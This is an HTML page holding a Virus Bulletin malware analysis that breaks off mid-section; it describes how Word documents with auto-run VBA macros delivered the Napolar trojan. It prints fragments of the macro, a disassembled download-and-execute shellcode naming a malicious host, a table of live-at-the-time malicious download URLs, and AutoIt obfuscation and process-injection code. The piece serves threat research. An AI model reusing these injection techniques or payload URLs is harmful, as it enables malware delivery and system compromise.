<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Back to VBA</title>
<meta name="description" content="Last month’s issue of Virus Bulletin featured a detailed analysis of the Polarbot (a.k.a. Solarbot) trojan. The article covered just about everything you could ever want to know about it – except for one thing: how does a computer end up being infected with this creation? Gabor Szappanos fills the gap by detailing one of the infiltration methods that was used extensively in the attack." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1692;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201404-VBA"></a>Back to VBA</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2014-04-02</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="firstname">Gabor</span> <span class="surname">Szappanos</span></h3><span class="orgname">Sophos</span>, <span class="orgdiv">Hungary</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>Last month&rsquo;s issue of Virus Bulletin featured a detailed analysis of the Polarbot (a.k.a. Solarbot) trojan. The article covered just about everything you could ever want to know about it &ndash; except for one thing: how does a computer end up being infected with this creation? Gabor Szappanos fills the gap by detailing one of the infiltration methods that was used extensively in the attack.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2014 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-2532" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-2532" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id2447458"></a></span></dt><dt><span class="sect1"><a href="#id4629590">Infection process</a></span></dt><dt><span class="sect1"><a href="#id4113731">IE_Explorer.exe and Process.exe </a></span></dt><dt><span class="sect1"><a href="#id4809976">Crypsola.exe</a></span></dt><dt><span class="sect1"><a href="#id2812487">Crypsoliar.exe</a></span></dt><dt><span class="sect1"><a href="#id3299111">Payload: Napolar</a></span></dt><dt><span class="sect1"><a href="#id4037614">Conclusion</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2447458"></a></h2></div></div></div><p>A VBA macro code that is a process injector, a downloader shellcode and an AutoIt process injector script makes a very bizarre and eclectic combination. This is exactly what we observed being used in an attack during the last quarter of 2013. Add to the mix the fact that the final payload is the infamous Napolar, and we have a truly dazzling constellation. </p><p>Last month&rsquo;s issue of <span class="emphasis"><em>Virus Bulletin</em></span> featured a detailed analysis of the Napolar (a.k.a. Polarbot/Solarbot) trojan [<span class="citation"><a href="#citation.1">1</a></span>]. The article covered just about everything you could ever want to know about it &ndash; except for one thing: how does a computer end up being infected with this creation? This article attempts to fill in the gap, detailing one of the infiltration methods that was used extensively in the attack. </p><p>It is not unusual nowadays for <span class="emphasis"><em>Word</em></span> documents to be utilized in attack scenarios to infect users. In fact, this is becoming increasingly common, as not only are APT groups using this method, but traditional cybercriminals have also discovered the advantages of it &ndash; for example, for deploying Zbot variants [<span class="citation"><a href="#citation.2">2</a></span>]. However, we have to travel several years back in time to find an ancient (and for all I knew, extinct) infection method in which a VBA macro was used instead of one of the popular <span class="emphasis"><em>Office</em></span> exploits such as CVE-2012-0158. </p><p>The infection scheme is summarized in <a href="#figure.1">Figure 1</a>, and will be described in more detail in the following sections. </p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Overview of infection method." src="/uploads/images/figures/2014/04/Napolar-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Overview of infection method.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4629590"></a>Infection process</h2></div></div></div><p>In the infection wave that we are concerned with, the malware was distributed in the old-fashioned way: by email. </p><p>The messages used social engineering techniques in order to deceive the recipient &ndash; such as the one shown in <a href="#figure.2">Figure 2</a>. </p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="Email using social engineering." src="/uploads/images/figures/2014/04/Napolar-2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;Email using social engineering.</b></p></div><p>Masquerading as an official message from a bank, the user is lured into opening the email attachment, which turns out to be a malicious <span class="emphasis"><em>Word</em></span> document containing VBA macro code. </p><p>The macro code, which is designed for automatic execution on opening, has the following structure: </p><pre class="programlisting">#If VBA7 Then
Private Declare PtrSafe Function CreateThread Lib &ldquo;kernel32&rdquo; (ByVal Lddqck As Long, ByVal Sxk As Long, ByVal Lssjnytp As LongPtr, 
Ordq As Long, ByVal Jwnefbq As Long, Haeya As Long) As LongPtr
  ...
#Else
Private Declare Function CreateThread Lib &ldquo;kernel32&rdquo; (ByVal Lddqck As Long, ByVal Sxk As Long, ByVal Lssjnytp As Long, Ordq As 
Long, ByVal Jwnefbq As Long, Haeya As Long) As Long
  ...
#End If
Sub Auto_Open()
  Dim Zjd As Long, Afaezkmrg As Variant, Bwqbj As Long
#If VBA7 Then
  Dim Zqinobi As LongPtr, Nfqzstrhn As LongPtr
#Else
  Dim Zqinobi As Long, Nfqzstrhn As Long
#End If
  ...
End Sub
Sub AutoOpen()
  Auto_Open
End Sub
Sub Workbook_Open()
  Auto_Open
End Sub
</pre><p>The &lsquo;#If&rsquo; structure in the heading makes sure that the code works on both 64-bit and 32-bit installations. The main code is in the Auto_Open() function, which is invoked by the two event handler functions: AutoOpen and Workbook_Open. This ensures that the code is executed whenever the document is opened. Even though this is cross-application code, and Workbook_Open could make it work in <span class="emphasis"><em>Excel</em></span>, we have not observed any <span class="emphasis"><em>Excel</em></span> workbooks in the distribution campaign. Nevertheless, the Workbook_Open stub remains in the code &ndash; which is probably due to the malware authors being too lazy to clean up the proof-of-concept code they used as &lsquo;inspiration&rsquo;. </p><p>Visual Basic for Applications (VBA) is the macro programming environment of <span class="emphasis"><em>Microsoft Office </em></span>applications. Although the Basic language has a bad reputation, this is quite a capable programming language &ndash; as has been well demonstrated by macro viruses in their prime and now by this malware. </p><p>There is an additional difficulty that comes from using a VBA macro as an infection vector instead of an exploit: from <span class="emphasis"><em>Office 2007 </em></span>onwards, the execution of VBA macros is disabled by default (if only this had happened 10 years and four <span class="emphasis"><em>Office</em></span> versions earlier, it would have changed the macro virus game completely!). The result is that, despite having an autostart macro, the VBA code will not execute in the newer versions of <span class="emphasis"><em>Office</em></span> &ndash; furthermore, an alert is displayed on the <span class="emphasis"><em>Word</em></span> menu bar which warns about the disabled macros, as shown in <a href="#figure.3">Figure 3</a>.</p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="&lsquo;Macros disabled&rsquo; warning." src="/uploads/images/figures/2014/04/Napolar-3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;&lsquo;Macros disabled&rsquo; warning.</b></p></div><p>However, the malware authors were prepared for this situation, and deployed another simple social engineering trick to overcome it. </p><p>The document displays a blurred account statement, and an explanation that the content has been obscured due to the security settings. Helpfully, an arrow points to the status bar at the top of the window, where the security warning about the macros is displayed, and where clicking on the &lsquo;Options&rsquo; button will reveal the option to enable macros. </p><p>This lures the user &ndash; who, thanks to the social engineering, is eager to see the blurred account information &ndash; to enable the execution of macros. </p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="Luring the user into enabling macro execution." src="/uploads/images/figures/2014/04/Napolar-4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;Luring the user into enabling macro execution.</b></p></div><p>Having done that, the VBA code will be executed the next time the document is opened. </p><p>The VBA code then builds a shellcode in an array, which is moved to a newly allocated memory area with a call to RtlMoveMemory. Finally, a new thread is created on this code by a call to CreateThread. </p><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="Shellcode injection implemented in VBA." src="/uploads/images/figures/2014/04/Napolar-5.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;Shellcode injection implemented in VBA.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/04/Napolar-5-large.jpg" target="_top">here</a> to view a larger version of Figure 5.)</p><p>The shellcode itself is the standard download-and-execute payload generated by the Metasploit framework, a snippet of which is shown in the following listing: </p><pre class="programlisting">  push  0E2899612h ; InternetReadFile
  call  ebp
  test  eax, eax
  jz    short loc_195
  pop   eax
  test  eax, eax
  jz    short loc_183
  push  0
  push  esp
  push  eax
  lea   eax, [esp+0Ch]
  push  eax
  push  ebx
  push  5BAE572Dh ; WriteFile
  call  ebp
  sub   esp, 4
  jmp   short loc_151
  push  ebx
loc_184:          ; CloseHandle
  push  528796C6h
  call  ebp
  push  0
  push  edi
  push  876F8B31h  ; WinExec
  call  ebp
loc_195:
  push  0
  push  0A2A1DE0h
  call  ebp
  call  loc_133
aRund11_exe  db &lsquo;rund11.exe&rsquo;,0
loc_1AE:
  call  loc_B3
aCarpentercommu  db &lsquo;carpentercommunities.com&rsquo;,0
</pre><p>The technique described in the preceding paragraphs is a very creative way of using macro programming (and lies very far from its original purpose &ndash; the automation of tedious text editing operations), but it is far from being original. In fact, the macro code used by the malware authors is an exact copy of the proof-of-concept code taken from [<span class="citation"><a href="#citation.3">3</a></span>]. </p><p>The variables used in the code have been replaced with random names, but that is a standard code re factoring practice in the malware development world. </p><p>The only notable difference is the shellcode, which in the case of the PoC was a standard Metasploit payload that executed calc.exe &ndash; in the observed samples, this was replaced with another standard Metasploit shellcode that downloads and executes an EXE file from a specified URL. </p><p>It is worth noting that the original idea of using VBA for process injection was first published by Didier Stevens in his blog [<span class="citation"><a href="#citation.4">4</a></span>]. He used a different approach, utilizing WriteProcessMemory and CreateThread, and the shellcode was also different. </p><p>Altogether, about a dozen <span class="emphasis"><em>Word</em></span> dropper samples were identified over the duration of the campaign. Additionally, a few other samples showed up using the same shellcode injection technique &ndash; however, these came from malware research labs, probably as a result of researchers playing with the code to try to understand its operation. The latter samples are omitted from <a href="#table.1">Table 1</a>, which summarizes the main characteristics of the samples. </p><div class="table"><a id="table.1"></a><table border="1" summary="Dropper documents identified in the campaign."><colgroup><col /><col /><col /><col /></colgroup><thead><tr><th align="center">First seen</th><th align="center">SHA1</th><th align="center">Attachment name</th><th align="center">Downloaded URL</th></tr></thead><tbody><tr><td>16/08/2013</td><td>202985b9fdd9d147341e25540dfdb243bd306b95</td><td>N/A</td><td>autotema11.ru/serv/Junior.exe</td></tr><tr><td>18/08/2013</td><td>5825cd3ef26235d76b1f93355b2990ec37528a7a</td><td>N/A</td><td>autotema11.ru/server/jSolar.exe</td></tr><tr><td>21/08/2013</td><td>ef698a24f3ee89b76433ffdee878d9ff92c04d45</td><td>entity1.doc</td><td>carpentercommunities.com/serve/crypsola.exe</td></tr><tr><td>22/08/2013</td><td>958ce870117af6269ee9d45bb64188e1fa99fb5d</td><td>New bill payment.doc </td><td>autotema11.ru/server/solarju.exe</td></tr><tr><td>03/09/2013</td><td>15783a1eb0c1b5d56ac5cefcfd89f7bcd68cd6b9</td><td>N/A</td><td>kasvatus.org/serve/solair.exe</td></tr><tr><td>09/09/2013</td><td>62e9b795d6ff189d0f712626397ef0ff0fbf2f52</td><td>N/A</td><td>kasvatus.org/serve/crypsola.exe</td></tr><tr><td>12/09/2013</td><td>25ee9e4d8f11059de5f4a438744d677ca60c73dd </td><td>IATA_Original_Account_form.doc</td><td>kasvatus.org/serve/crypsoliar.exe</td></tr><tr><td>15/09/2013</td><td>183704daabdf93c8bdcc2d65a28c3f5fa32e041e </td><td>IATA_original_paymen </td><td>kasvatus.org/serve/crysol.exe</td></tr><tr><td>03/10/2013</td><td>8f599386ede0ff711f3aae6c3d4e8da2abf7b4c0 </td><td>Your_Bank_Account_Overview.doc</td><td>webservice.cl/files/IE_Monitor.exe</td></tr><tr><td>07/10/2013</td><td>90ac1f4b23b81c5697e19217bc7a4472fc54a2d3 </td><td>IATA_Original_Paymen</td><td>webservice.cl/files/IE_Monitor.exe</td></tr><tr><td>09/10/2013</td><td>ca7bc0d21d66a72ea80d693dd3b097e7a35b2110 </td><td>Your_Bank_Account_Overview.doc</td><td>webservice.cl/files/Process.exe</td></tr><tr><td>14/10/2013</td><td>f5cb147f47248f7ab24ea9ae66ad7ec94340c4d3</td><td>Your_Bank_Account_Overview.doc</td><td>dopline.ru/js_file/Process.exe</td></tr><tr><td>15/10/2013</td><td>3ccd9c44b98fec8064b7dea6e38743394ddc839d </td><td>Profoma+Invoice.doc</td><td>webservice.cl/files/updater.exe</td></tr><tr><td>21/10/2013</td><td>39c4cf87b32feb929272746667aff96fd282b864 </td><td>Account_History_Overview.doc</td><td>dopline.ru/js_file/IE_Explorer.exe</td></tr><tr><td>28/11/2013</td><td>40f30a18fb8067cc617d7b55fe194011e43cac69</td><td>N/A</td><td>sunshineyogafitness.com/development/juni-crypt.exe</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;Dropper documents identified in the campaign.</b></p></div><p>The first-seen date of the individual samples shows that the campaign was running in the August&ndash;October timeframe, with regular, and more or less evenly distributed releases of new variants. </p><p>Every <span class="emphasis"><em>Word</em></span> document contains additional information, besides the document text &ndash; and the malicious documents in our investigation were no exception. The most important part of this additional data was the name of the user who last saved the document (see <a href="#figure.6">Figure 6</a>). </p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="Author name in the properties." src="/uploads/images/figures/2014/04/Napolar-6.jpg" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;Author name in the properties.</b></p></div><p>It is worth remembering the two user names that were observed in the documents: <span class="emphasis"><em>Johntab</em></span> and <span class="emphasis"><em>Johntab-PC</em></span>, because this is not the last time we will see them. </p><p>Each of the samples downloaded an executable from a specified URL. There was very little overlap between the links, with only one recurrence observed. On the other hand, in many cases the same server was used with different filenames. </p><p>Unfortunately, we were only able to retrieve a handful of downloaded executables for analysis, as the URLs were usually very short-lived. </p><p>The live downloads yielded the following files:</p><div class="variablelist"><dl><dt><span class="term">37f6e5ba7ed966228e79036698419a78a9583b62:</span></dt><dd><p>crypsola.exe</p></dd><dt><span class="term">c72d5c35ea8aaa366b457e622ab235641c06376a: </span></dt><dd><p>IE_Explorer.exe</p></dd><dt><span class="term">14de27f59db24219073feb546f161a179d013dfd: </span></dt><dd><p>Process.exe</p></dd><dt><span class="term">ece7650ad323706c3a3dfcfe539a25ded53ab3e7: </span></dt><dd><p>crypsoliar.exe</p></dd></dl></div><p>Looking at them more closely led to the next surprise: each of them was a heavily obfuscated AutoIt script compiled into a standalone executable created with the purpose of decoding and executing the final payload, which turned out to be a Napolar bot.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4113731"></a>IE_Explorer.exe and Process.exe </h2></div></div></div><p>Both IE_Explorer.exe (c72d5c35ea8aaa366b457e622ab235641c06376a) and Process.exe (14de27f59db24219073feb546f161a179d013dfd) are are standalone compiled AutoIT executables, with heavily obfuscated script content. They differ only in the embedded final payload; the AutoIt code is the same. </p><p>The AutoIT code builds and executes two shellcodes: an RC4 decoder and an injector. The first serves for decrypting the final executable payload, and the second injects the payload into a newly created process. </p><p>Most of the script commands are hidden behind EXECUTE(BINARYTOSTRING()) constructs. In this form, the AutoIt script instructions are stored in hexadecimal ASCII representation, which is first decoded to the command string, and then executed. For example, the decoder function is represented in the following form: </p><pre class="programlisting">EXECUTE ( BINARYTOSTRING (  &ldquo;0x2449664745575451676873545642626a732026204368722841736328537472696e674d6964202824506c736a6b646d48475
366684a6b736965772c2024692c20312929202b203929&rdquo; ) )</pre><p>This is converted by the BINARYTOSTRING() call to a more intuitive original form: </p><pre class="programlisting">$IfGEWTQghsTVBbjs &amp; Chr(Asc(StringMid ($PlsjkdmHGSfhJksiew, $i, 1)) + 9)</pre><p>Finally, the EXECUTE() command runs it. </p><p>On top of that, string constants, along with the shellcode itself, are encoded by a simple shift-by-nine-bytes (or Caesar cypher, if you prefer fancy names), as seen from the decoder above, resulting in the incomprehensible form shown in <a href="#figure.7">Figure 7</a>. </p><div class="figure"><a id="figure.7"></a><div class="mediaobject"><img alt="Encrypted shellcode and its decoder." src="/uploads/images/figures/2014/04/Napolar-7.jpg" /></div><p class="title"><b>Figure&nbsp;7.&nbsp;Encrypted shellcode and its decoder.</b></p></div><p>The final payload executable is RC4 encrypted and appended after the compressed script code in the AutoIt executable. A fragment of the RC4 decoder shellcode is shown in <a href="#figure.8">Figure 8</a>.</p><div class="figure"><a id="figure.8"></a><div class="mediaobject"><img alt="RC4 decoder shellcode implementation." src="/uploads/images/figures/2014/04/Napolar-8.jpg" /></div><p class="title"><b>Figure&nbsp;8.&nbsp;RC4 decoder shellcode implementation.</b></p></div><p>The malware uses the string &lsquo;mauasdsADadADAudASJDUasdS7ADHadA765asd&rsquo; as the start and end marker of the RC4 encrypted data; in addition, this string also serves as the decryption key. </p><p>This RC4 implementation is not an original development, it was taken straight from the source: https://code.google.com/p/autoit-cn/source/browse/trunk/UserInclude/ACN_HASH.au3. </p><p>The decoded content is a Win32 executable, which is executed using a process injector shellcode, a snippet of which is shown in <a href="#figure.9">Figure 9</a>. </p><div class="figure"><a id="figure.9"></a><div class="mediaobject"><img alt="Process injector shellcode invoked from the AutoIt script." src="/uploads/images/figures/2014/04/Napolar-9.jpg" /></div><p class="title"><b>Figure&nbsp;9.&nbsp;Process injector shellcode invoked from the AutoIt script.</b></p></div><p>The shellcodes are started using a sequence of calls to the functions DllStrucSetData (to fill the procedure buffer) and DllCall (to execute the buffer by invoking CallWindowProcW):</p><pre class="programlisting">DllStructSetData($sdssdsdeessddsss, 1, $injector_shell)
DllStructSetData($sdssdsdeessddseess, 1, $sdssdsdssddsss)
DllCall(&ldquo;user32.dll&rdquo;, &ldquo;int&rdquo;, &ldquo;CallWindowProcW&rdquo;, &ldquo;ptr&rdquo;, DllStructGetPtr($sdssdsdeessddsss), &ldquo;wstr&rdquo;, (@AutoItExe), 
&ldquo;ptr&rdquo;, DllStructGetPtr($sdssdsdeessddseess), &ldquo;int&rdquo;, 0, &ldquo;int&rdquo;, 0)
</pre><p>This method of project injection is discussed in [<span class="citation"><a href="#citation.5">5</a></span>] &ndash; an idea by <span class="emphasis"><em>reasen</em></span>, an infamous AutoIt malware author. The attribution to this author is reflected in the embedded project path stored in the compiled executable: &lsquo; C:\Users\reasen\Desktop\&rsquo;. </p><p>One of the common tools used for compiling AutoIt scripts into standalone executables is <span class="emphasis"><em>AutoIt3Wrapper</em></span> [<span class="citation"><a href="#citation.6">6</a></span>]. This offers several directives to fine-tune the final executable. One of the directives is #AutoIt3Wrapper_Ico, which allows a custom icon to be used for the standalone executable. This directive was used to change the icon of the malicious executables into one resembling that of the <span class="emphasis"><em>OpenOffice</em></span> suite. An interesting fact for us is that the script in the compiled executable contains all of the wrapper directives &ndash; including the full path of the custom icon. This may give us information about the username of the person who compiled the executable. </p><p>The code shows some similarity with reasencrypt [<span class="citation"><a href="#citation.7">7</a></span>]. </p><p><span class="emphasis"><em>reasen: A well-known AutoIt malware creator, most of whose appearances are on Spanish sites.</em></span></p><p><span class="emphasis"><em>Also uses the name: Reasen Elbereth.</em></span></p><p><span class="emphasis"><em>http://reasenelbereth.blogspot.com.es/ </em></span></p><p><span class="emphasis"><em>https://twitter.com/Reasen0 http://www.slideshare.net/TheReasen </em></span></p><p><span class="emphasis"><em>Allegedly also coded by reasen: http://www.grendelcrypter.com/contact-us.html</em></span></p><p>There is no evidence to suggest that reasen is directly involved in this campaign; the other samples show stronger attributions to different people. It is more likely that he sold the AutoIt cryptor to the authors of this malware &ndash; or equally likely that the malware authors just took a sample created by reasen, and replaced the encrypted content. This can easily be done, as only the binary content needs to be regenerated using the known RC4 key, then the content between the start and end marker needs to be replaced by the encrypted content. In this case, the embedded payload was added to the EXE after the compilation. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4809976"></a>Crypsola.exe</h2></div></div></div><p>The AutoIt script in the Crypsola.exe sample (37f6e5ba7ed966228e79036698419a78a9583b62) features less obfuscation than the previous sample, using only the EXECUTE(BINARYTOSTRING()) trick &ndash; there is no additional encoding on top of it. </p><p>Interestingly, this script checks if the avastui.exe process is running. If the process is running, the script waits for 25 seconds, and then continues with the execution. This may be an attempt to abuse a timing issue in the <span class="emphasis"><em>Avast</em></span> anti malware product; this trick has also been observed in other AutoIt malware [<span class="citation"><a href="#citation.8">8</a></span>].</p><p>The script commands are concatenated to strings byte by byte in a lengthy way, as shown in <a href="#figure.10">Figure 10</a>.</p><div class="figure"><a id="figure.10"></a><div class="mediaobject"><img alt="String building." src="/uploads/images/figures/2014/04/Napolar-10.jpg" /></div><p class="title"><b>Figure&nbsp;10.&nbsp;String building.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/04/Napolar-10-large.jpg" target="_top">here</a> to view a larger version of Figure 10.)</p><p>A less commonly used feature is the fact that standalone AutoIt executables are also archives that can contain further embedded files apart from the scripts themselves &ndash; in our case, an embedded text file. The latter is dropped to %TEMP%\deepweb.txt with the script command:</p><pre class="programlisting">FILEINSTALL ( &ldquo;f.txt&rdquo; , @TEMPDIR &amp; &ldquo;\deepweb.txt&rdquo; , 1 )</pre><p>This line of code has two effects. When the malware author compiled the EXE, the content of the file f.txt was embedded into the final executable. During execution, this embedded content is saved to the file deepweb.txt in the temporary directory. The file contains an ASCII representation of the payload EXE.</p><div class="figure"><a id="figure.11"></a><div class="mediaobject"><img alt="Payload executable stored in ASCII representation." src="/uploads/images/figures/2014/04/Napolar-11.jpg" /></div><p class="title"><b>Figure&nbsp;11.&nbsp;Payload executable stored in ASCII representation.</b></p></div><p>The AutoIt script decodes it, and using the same injector shellcode as the other sample, executes it. </p><p>Unlike the samples in the previous section, this one does not use <span class="emphasis"><em>AutoIt3Wrapper</em></span>. However, it is still possible to extract the project path from the compiled executable. The compiled executable contains encrypted metadata, one field of which is seemingly the full path of a temporary file, which also reveals the username: C:\Users\<span class="emphasis"><em>Johntab</em></span>\AppData\Local\Temp\aut451B.tmp. The importance of this is that the username matches the one found earlier among the properties of the dropper <span class="emphasis"><em>Word</em></span> documents &ndash; which indicates that this class of the AutoIt payload was created by the same user (and likely on the same computer) as the <span class="emphasis"><em>Word</em></span> carrier documents.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2812487"></a>Crypsoliar.exe</h2></div></div></div><p>The Crypsoliar.exe sample (ece7650ad323706c3a3dfcfe539a25ded53ab3e7) is a medley of the previous two. It uses a shift by-two encryption of strings on top of the EXECUTE(BINARYTOSTRING()) trick, and the files are dropped using FileInstall. Junk string variable assignments are inserted into the code in the following form: </p><pre class="programlisting">$KFXAFMBTBJ7463539079213644 = &ldquo;SXdMCxnwLc18682537269213644&rdquo;
$APJXYJBAUV8426698989213644 = &ldquo;hhojVVnDEo19645697179213644&rdquo;
LOCAL $MLFJUEIDLE = EXECUTE ( BINARYTOSTRING ( FHVNVLTILJTHBER ( &ldquo;.v224a4a3152505341522150434/52430600405752433`000.040.0.2047
4c4/50572a434c06023/52562331274d3/3042070.04003b0007&rdquo; ) ) )
$PAUVSHBGNI9389858899213644 = &ldquo;wrAHosOjXb20608857089213644&rdquo;
$EKFSLEBMHU10353018809213644 = &ldquo;MckeIpOQqn97180529213644&rdquo;
</pre><p>In this case, not one but two files are dropped into the temporary directory:</p><pre class="programlisting">FILEINSTALL ( &ldquo;kFxaFMBTbjgn9675177345409009.txt&rdquo; , @TEMPDIR &amp; &ldquo;\f.txt&rdquo; , 1 )
FILEINSTALL ( &ldquo;ns.bin&rdquo; , @TEMPDIR &amp; &ldquo;\ns.txt&rdquo; , 1 )
